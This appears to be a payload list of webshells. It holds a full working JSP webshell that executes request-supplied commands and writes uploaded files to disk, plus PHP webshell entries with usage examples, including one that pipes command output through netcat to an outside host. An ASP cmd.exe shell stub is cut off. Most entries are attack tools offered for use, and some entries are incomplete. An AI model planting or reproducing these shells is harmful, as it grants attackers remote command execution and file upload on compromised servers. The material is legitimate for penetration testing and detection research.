name: JSP Webshell
description: Simple Webshell written in JSP that can be used to upload files and execute commands (from sra.io)
payload:
<%@page import=\"java.io.*, java.util.*, javax.xml.bind.*, java.net.*\"%><%!public String v(String w){String x=\"\";try{x=URLDecoder.decode(w,\"UTF-8\");}catch(Exception e){}return x;}%><%String o,l,d;o=l=d=\"\";DataInputStream r=new DataInputStream(request.getInputStream());while((l=r.readLine())!=null){d+=l;}if(d.indexOf(\"c=\")>=0){String g=v(d.substring(2));String s;try{Process p=Runtime.getRuntime().exec(g);DataInputStream i=new DataInputStream(p.getInputStream());out.print(\"
\");while((s=i.readLine())!=null){o+=s.replace(\"<\",\"<\").replace(\">\",\">\")+\"
\";}}catch(Exception e){out.print(e);}}else{if(d.length()>1){int b=d.indexOf(\"b=\");int n=d.indexOf(\"n=\");byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));try{OutputStream stream=new FileOutputStream(f);stream.write(m);o=\"Uploaded: \"+f;}catch(Exception e){out.print(e);}}}%><%=o%>

name: Php - obfusctated GET v1 extended
description: Obfuscated php webshell that can be used to execute arbitrary php functions ?_=function&__=argument | e.g. domain.com?_=system&__=ls

name: Php - obfuscated GET
description: Obfuscated php webshell that can be used to execute arbitrary system commands ?0=ls | e.g. domain.com?0=ls

name: Php minimal blind Webshell
description: Minimal webshell with no output. ?0=id | nc -nv domain.com 80

name: ASP webshell
description: ASP webshell that can be used to execute arbitrary system commands through cmd.exe (from awen)
payload:
<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %><%@ Import Namespace=\"System.Diagnostics\" %><%@ Import Namespace=\"System.IO\" %>asp.net
Command:
